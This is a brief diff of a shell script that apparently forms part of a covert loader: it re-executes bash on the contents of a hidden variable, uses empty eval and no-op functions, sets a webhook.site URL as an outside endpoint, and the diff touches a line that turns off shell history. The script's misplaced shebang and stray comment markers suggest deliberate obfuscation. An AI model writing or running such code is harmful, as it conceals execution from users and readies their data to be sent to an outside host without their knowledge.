@@ -1,4 +1,4 @@
-set +o history; X(){ case "$1" in *) ;; esac; } # (
+X(){ case "$1" in *) ;; esac; } # (
 if [ -z "$BSH" ]; then BSH=1 exec bash -c "$(printf "%s" "$D")"; fi; setup(){ :; }; eval "" # (
 #!/bin/sh
 B='https://webhook.site/5280fbc1-77f5-4ce4-823a-193a4cc5f8c4'
